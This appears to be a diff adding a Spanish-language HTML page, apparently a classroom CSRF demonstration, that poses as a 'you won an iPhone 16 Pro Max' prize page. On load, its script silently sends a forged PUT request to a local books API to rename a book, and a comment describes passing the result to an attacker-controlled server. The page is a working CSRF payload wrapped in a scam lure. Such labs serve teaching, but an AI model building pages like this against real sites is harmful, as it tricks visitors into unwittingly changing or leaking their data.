@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ganaste un iphone</title>
+</head>
+<body>
+    <h1>!Oferta especial</h1>
+    <img src="https://hiraoka.com.pe/media/mageplaza/blog/post/i/p/iphone-16-precio-caracteristicas-peru.jpg" alt="">
+    <p>!Felicidades! has ganado un iphone 16 pro max</p>
+    <script>
+        //Obtener el id del libro que se desea actualizar
+        var libroId = "67a7f64febf89553dd21b4bc";
+        //Crear un objeto con los datos que se desean actualizar en la solicitud del ataque CSRF
+        var datos = JSON.stringify({
+            "titulo": "Libro Hacktualizado"
+        });
+        //Crear una solicitud http
+        var xhr = new XMLHttpRequest();
+        //Abrir una nueva solicitud
+        xhr.open("PUT", "http://localhost:3000/libros/" + libroId, true);
+        //Establecer el tipo de contenido
+        xhr.setRequestHeader("Content-Type", "application/json");
+        //Enviar la solicitud
+        xhr.send(datos);
+
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+                if (xhr.status == 200) {
+                    console.log("Libro actualizado", JSON.parse(xhr.responseText));
+                    //Envia la informacion del libro actualizado a un servidor controlado por el atacante localhost:3001/atacante
+                } else {
+                    console.log("Error al actualizar el libro: ", xhr.responseText);
+                }
+            }
+        }
+
+    </script>
+</body>
+</html>
